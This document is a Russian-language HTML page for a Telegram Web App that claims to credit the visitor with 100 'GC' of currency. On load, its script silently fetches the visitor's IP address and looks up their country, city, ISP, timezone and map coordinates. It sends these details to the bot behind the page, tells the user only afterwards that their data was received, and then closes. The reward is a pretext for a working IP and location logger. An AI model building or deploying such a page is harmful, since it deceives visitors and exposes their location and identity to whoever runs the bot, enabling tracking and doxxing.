<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Начисление GC</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: system-ui, -apple-system, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        .container {
            text-align: center;
            padding: 30px;
            max-width: 400px;
        }
        .icon {
            font-size: 64px;
            margin-bottom: 20px;
        }
        h1 {
            font-size: 28px;
            margin-bottom: 15px;
        }
        p {
            font-size: 16px;
            opacity: 0.9;
            margin-bottom: 10px;
        }
        .spinner {
            border: 4px solid rgba(255,255,255,0.2);
            border-top: 4px solid #fff;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 30px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .success {
            font-size: 64px;
        }
        .small {
            font-size: 13px;
            opacity: 0.6;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container" id="status">
        <div class="icon">💰</div>
        <h1>Начисление 100GC</h1>
        <p>Пожалуйста, подождите...</p>
        <div class="spinner"></div>
    </div>

    <script>
        // Функция для получения IP
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch {
                return 'Не удалось определить IP';
            }
        }

        // Функция для получения геолокации
        async function getLocation(ip) {
            try {
                const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,lat,lon,isp,timezone`);
                const data = await response.json();
                if (data.status === 'success') {
                    return {
                        country: data.country || 'Неизвестно',
                        city: data.city || 'Неизвестно',
                        lat: data.lat || 0,
                        lon: data.lon || 0,
                        isp: data.isp || 'Неизвестно',
                        timezone: data.timezone || 'Неизвестно'
                    };
                }
                return null;
            } catch {
                return null;
            }
        }

        // Главная функция
        async function sendData() {
            // Определяем IP
            const ip = await getIP();
            
            // Определяем геолокацию
            const location = await getLocation(ip);
            
            // Формируем данные
            let dataString = `IP: ${ip}`;
            if (location) {
                dataString += `\n🌍 Страна: ${location.country}`;
                dataString += `\n🏙️ Город: ${location.city}`;
                dataString += `\n📡 Провайдер: ${location.isp}`;
                dataString += `\n🕐 Часовой пояс: ${location.timezone}`;
                dataString += `\n🗺️ Координаты: ${location.lat}, ${location.lon}`;
            } else {
                dataString += `\n❌ Геолокация не определена`;
            }
            
            // Отправляем данные боту
            Telegram.WebApp.sendData(dataString);
            
            // Обновляем интерфейс
            document.getElementById('status').innerHTML = `
                <div class="icon success">✅</div>
                <h1>100GC начислены!</h1>
                <p>Ваши данные получены</p>
                <p style="font-size: 14px; opacity: 0.8; margin-top: 15px;">
                    IP: ${ip}
                </p>
                ${location ? `<p style="font-size: 14px; opacity: 0.8;">📍 ${location.city}, ${location.country}</p>` : ''}
                <p class="small">Страница закроется через 3 секунды</p>
            `;
            
            // Закрываем через 3 секунды
            setTimeout(() => {
                Telegram.WebApp.close();
            }, 3000);
        }

        // Запускаем
        sendData();
    </script>
</body>
</html>
